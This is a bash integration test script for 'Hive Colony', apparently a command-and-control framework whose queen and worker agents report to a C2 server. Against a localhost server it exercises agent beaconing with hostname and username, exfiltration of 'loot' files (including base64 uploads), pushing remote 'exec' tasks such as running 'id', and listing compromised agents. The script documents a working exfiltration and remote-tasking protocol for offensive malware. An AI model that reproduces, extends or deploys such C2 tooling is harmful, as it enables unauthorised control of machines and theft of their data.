#!/usr/bin/env bash
# Hive Colony End-to-End Integration Test
set -euo pipefail

C2_PORT=${C2_PORT:-8444}
C2_URL="http://127.0.0.1:${C2_PORT}"
LOOT_DIR="./loot_e2e"
DIR=$(dirname "$0")
PASS=0
FAIL=0

cleanup() {
    echo "=== Cleanup ==="
    rm -rf "$LOOT_DIR"
    pkill -f "c2-server" 2>/dev/null || true
    pkill -f "queen" 2>/dev/null || true
    pkill -f "worker" 2>/dev/null || true
}
trap cleanup EXIT

assert_eq() {
    local desc="$1" expected="$2" actual="$3"
    if [ "$expected" = "$actual" ]; then
        echo "  PASS: $desc"
        PASS=$((PASS + 1))
    else
        echo "  FAIL: $desc (expected: $expected, got: $actual)"
        FAIL=$((FAIL + 1))
    fi
}

assert_contains() {
    local desc="$1" needle="$2" haystack="$3"
    if echo "$haystack" | grep -q "$needle"; then
        echo "  PASS: $desc"
        PASS=$((PASS + 1))
    else
        echo "  FAIL: $desc (missing: $needle)"
        FAIL=$((FAIL + 1))
    fi
}

echo "╔══════════════════════════════════════╗"
echo "║   HIVE COLONY E2E TEST              ║"
echo "╚══════════════════════════════════════╝"
echo ""

# 1. Start C2 server
echo "=== Test 1: Start C2 server ==="
cargo run -p c2-server -- --port "$C2_PORT" --loot-dir "$LOOT_DIR" --db-path /tmp/hive_e2e.db > /tmp/hive_c2_e2e.log 2>&1 &
C2_PID=$!
sleep 2

HEALTH=$(curl -sf "$C2_URL/health" 2>/dev/null || echo "")
assert_contains "C2 health endpoint" "ok" "$HEALTH"

# 2. Beacon
echo "=== Test 2: Agent beacon ==="
BEACON=$(curl -sf -X POST "$C2_URL/beacon" \
    -H "X-Agent-ID: test-001" \
    -H "X-Agent-Role: worker" \
    -d '{"hostname":"e2e-test","username":"root","os":"linux","version":"3.0.0"}' 2>/dev/null || echo "")
assert_contains "Beacon accepted" "ack" "$BEACON"

# 3. Collect
echo "=== Test 3: Exfil collect ==="
TEST_DATA="HIVE_COLONY_E2E_TEST_$(date +%s)"
COLLECT=$(curl -sf -X POST "$C2_URL/collect" \
    -H "X-Agent-ID: test-001" \
    -H "X-Agent-Role: worker" \
    -H "X-File-Name: e2e_test.txt" \
    -d "$TEST_DATA" 2>/dev/null || echo "")
assert_contains "Collect accepted" "received" "$COLLECT"

# Verify file landed
LOOT_FILE=$(ls "$LOOT_DIR"/*e2e_test* 2>/dev/null || echo "")
assert_contains "Loot file exists" "e2e_test" "$LOOT_FILE"
if [ -f "$LOOT_FILE" ]; then
    CONTENT=$(cat "$LOOT_FILE")
    assert_eq "Loot content matches" "$TEST_DATA" "$CONTENT"
fi

# 4. Task push/pull
echo "=== Test 4: Task push/pull ==="
TASK_PUSH=$(curl -sf -o /dev/null -w "%{http_code}" -X POST "$C2_URL/task/test-001" \
    -H "Content-Type: application/json" \
    -d '{"id":"t1","command":"exec","payload":{"cmd":"id"}}' 2>/dev/null || echo "")
assert_eq "Task push returns 201" "201" "$TASK_PUSH"

TASK_PULL=$(curl -sf "$C2_URL/task/test-001" 2>/dev/null || echo "")
assert_contains "Task pull returns task" "t1" "$TASK_PULL"
assert_contains "Task pull has command" "exec" "$TASK_PULL"

# 5. Agent summary
echo "=== Test 5: Agent admin ==="
AGENTS=$(curl -sf "$C2_URL/admin/agents" 2>/dev/null || echo "")
assert_contains "Agent admin lists agents" "test-001" "$AGENTS"

# 6. Error handling
echo "=== Test 6: Error handling ==="
NOT_FOUND=$(curl -sf -o /dev/null -w "%{http_code}" "$C2_URL/nonexistent" 2>/dev/null || echo "")
assert_eq "Unknown route returns 404" "404" "$NOT_FOUND"

# 7. Base64 collect
echo "=== Test 7: Base64 collect ==="
B64_DATA=$(echo "base64_test_payload" | base64)
B64_COLLECT=$(curl -sf -X POST "$C2_URL/collect?filename=b64_test.bin" \
    -H "X-Agent-ID: test-001" \
    -H "Content-Transfer-Encoding: base64" \
    -d "$B64_DATA" 2>/dev/null || echo "")
assert_contains "Base64 collect accepted" "received" "$B64_COLLECT"

# Summary
echo ""
echo "╔══════════════════════════════════════╗"
echo "║   RESULTS                           ║"
echo "╠══════════════════════════════════════╣"
echo "║  PASS: $PASS"
echo "║  FAIL: $FAIL"
echo "╚══════════════════════════════════════╝"

[ "$FAIL" -eq 0 ] && exit 0 || exit 1
